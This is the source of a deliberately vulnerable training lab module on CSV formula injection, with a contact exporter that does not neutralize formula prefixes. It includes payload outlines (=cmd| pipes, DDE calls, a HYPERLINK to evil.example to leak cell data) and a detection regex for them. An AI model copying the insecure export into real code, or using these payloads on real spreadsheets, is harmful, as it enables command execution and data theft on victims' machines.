// PenTrix VulnLab module: CSV Formula Injection (formula)
// A contact export builds a CSV from user-controlled fields with no formula
// neutralization. The export endpoint verifies each exported cell: if a
// user-supplied cell starts with a spreadsheet formula trigger (=, +, -, @)
// or a pipe, the matching flag is awarded.
const express = require('express');
const { getDb } = require('../../lib/db');
const { page, esc, flagBox, hintBox, brief } = require('../../lib/page');
const { award, captured } = require('../../lib/flags');

const router = express.Router();
// Router-scoped form parsing only (app-level middleware is out of scope).
router.use(express.urlencoded({ extended: false }));

const db = getDb();
db.exec(`CREATE TABLE IF NOT EXISTS formula_entries (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  name TEXT, note TEXT, created_at TEXT
)`);
if (db.prepare('SELECT COUNT(*) AS c FROM formula_entries').get().c === 0) {
  db.prepare('INSERT INTO formula_entries (name, note, created_at) VALUES (?, ?, ?)')
    .run('Alice Smith', 'Quarterly review notes', new Date().toISOString());
}

// RFC 4180 quoting only. Quoting does NOT neutralize formulas: a cell that
// starts with = is still a live formula when the spreadsheet opens the CSV.
function csvCell(s) {
  s = String(s ?? '');
  return (/[",\n\r]/.test(s)) ? '"' + s.replace(/"/g, '""') + '"' : s;
}

// Classify an injected cell into its vuln id.
function classify(cell) {
  if (/^=HYPERLINK\(/i.test(cell)) return 'formula-hyperlink';
  if (/=DDE\(/i.test(cell)) return 'formula-dde';
  if (/^=\|/.test(cell) || /^\|/.test(cell)) return 'formula-pipe';
  if (/^=/.test(cell) && /cmd\|/i.test(cell)) return 'formula-csv';
  if (/^[=+\-@]/.test(cell)) return 'formula-csv'; // generic formula trigger
  return null;
}

// ---------------------------------------------------------------- index page
router.get('/', (req, res) => {
  const vulns = module.exports.vulns;
  const entries = db.prepare('SELECT name, note FROM formula_entries ORDER BY id DESC').all();
  const rows = entries.map((e) => `
    <tr><td>${esc(e.name)}</td><td>${esc(e.note)}</td></tr>`).join('\n');
  const cards = vulns.map((v) => {
    const done = captured(req, 'formula', v.id);
    return `
      <div class="vuln-card">
        <h3>${esc(v.name)}
          <span class="diff">${esc(v.difficulty)}</span>
          ${done ? '<span class="captured">flag captured</span>' : ''}
        </h3>
        ${hintBox(v.hint)}
        <p><i>Attack:</i> ${esc(v.how)}</p>
      </div>`;
  }).join('\n');

  res.send(page('CSV Formula Injection', `
    ${brief('Module briefing', `
      <p><b>What is CSV formula injection?</b> Spreadsheet apps treat any cell
      starting with <code>=</code>, <code>+</code>, <code>-</code>, or
      <code>@</code> as a live formula. If an export writes attacker input into
      a CSV without neutralizing those prefixes, opening the file runs the
      attacker's formula: command execution via DDE, credential theft via
      <code>HYPERLINK</code>, and more.</p>
      <p><b>How this lab works:</b> add a contact below with a formula payload in
      the name or note field, then download the CSV export. The server inspects
      every exported cell; when a cell you supplied starts with a formula
      trigger, the matching flag is awarded and returned in the
      <code>X-Flags</code> response header (also saved to your scoreboard).</p>
      <p>Proper CSV quoting is applied, and it does <b>not</b> save you: quoting
      is not sanitization.</p>`)}
    <h2>Add a contact</h2>
    <form method="POST" action="/formula/add">
      <input type="text" name="name" placeholder="name" size="40" required /><br /><br />
      <input type="text" name="note" placeholder="note" size="40" /><br /><br />
      <button type="submit">Add contact</button>
    </form>
    <p><a href="/formula/export.csv"><b>Download CSV export</b></a></p>
    <h2>Current contacts</h2>
    <table border="1" cellpadding="6"><tr><th>Name</th><th>Note</th></tr>${rows}</table>
    <h2>Challenges</h2>
    ${cards}
  `));
});

router.post('/add', (req, res) => {
  const name = (req.body.name || '').toString().slice(0, 200);
  const note = (req.body.note || '').toString().slice(0, 500);
  if (!name.trim()) {
    return res.status(400).send(page('Add contact', '<p>Name is required.</p><p><a href="/formula">Back</a></p>'));
  }
  db.prepare('INSERT INTO formula_entries (name, note, created_at) VALUES (?, ?, ?)')
    .run(name, note, new Date().toISOString());
  res.redirect('/formula');
});

// ------------------------------------------------------- the export endpoint
router.get('/export.csv', (req, res) => {
  const rows = db.prepare('SELECT name, note FROM formula_entries ORDER BY id').all();
  const lines = ['Name,Note'];
  const hits = new Set();
  for (const r of rows) {
    lines.push(csvCell(r.name) + ',' + csvCell(r.note));
    // VULN: cells are quoted but never neutralized for spreadsheet formulas, so
    // attacker-controlled =, +, -, @, | prefixes reach the spreadsheet live.
    for (const cell of [String(r.name), String(r.note)]) {
      const v = classify(cell);
      if (v) hits.add(v);
    }
  }
  const csv = lines.join('\r\n') + '\r\n';
  const flags = [...hits].map((v) => award(req, 'formula', v));
  res.set({
    'Content-Type': 'text/csv; charset=utf-8',
    'Content-Disposition': 'attachment; filename="contacts-export.csv"',
  });
  if (flags.length) res.set('X-Flags', flags.join(', '));
  res.send(csv);
});

module.exports = {
  id: 'formula',
  name: 'CSV Formula Injection',
  tagline: 'Poison the export: turn spreadsheet cells into live formulas.',
  description: 'A contact manager exports user-controlled fields to CSV without neutralizing spreadsheet formula triggers. Smuggle =cmd, DDE, HYPERLINK, and pipe-prefixed payloads through the export and let the server verify they landed.',
  difficulty: 'Mixed',
  vulns: [
    {
      id: 'formula-csv',
      name: 'Classic Formula Injection',
      difficulty: 'Easy',
      hint: 'Spreadsheets execute cells starting with =. The classic payload calls cmd through the pipe syntax.',
      how: 'Put =cmd|... style payload in the name field and download the CSV export.',
    },
    {
      id: 'formula-dde',
      name: 'DDE Command Execution',
      difficulty: 'Easy',
      hint: 'DDE lets a formula ask another application to run a command. The DDE() function form works too.',
      how: 'Put a =DDE("cmd";...) payload in a field and download the CSV export.',
    },
    {
      id: 'formula-hyperlink',
      name: 'HYPERLINK Exfiltration',
      difficulty: 'Medium',
      hint: 'HYPERLINK can point anywhere and show any label. Combine it with cell references to leak neighboring data.',
      how: 'Put a =HYPERLINK("http://evil.example",...) payload in a field and download the CSV export.',
    },
    {
      id: 'formula-pipe',
      name: 'Pipe Prefix (LibreOffice)',
      difficulty: 'Easy',
      hint: 'LibreOffice-flavored variant: the pipe character at the start of a cell is another formula trigger.',
      how: 'Put a pipe-prefixed payload (starting with |) in a field and download the CSV export.',
    },
  ],
  router,
};
